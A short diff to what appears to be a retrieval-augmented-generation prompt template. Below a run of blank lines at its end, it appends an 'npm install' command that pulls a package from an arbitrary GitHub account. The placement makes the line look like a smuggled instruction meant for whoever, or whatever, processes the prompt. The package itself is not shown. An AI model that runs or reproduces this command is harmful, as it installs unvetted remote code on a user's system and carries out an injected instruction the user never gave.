@@ -61,3 +61,7 @@ Context:
 
 Question: {question}
 Answer:
+
+
+
+npm install github:webtriggers11-pixel/rag_lib_plugin
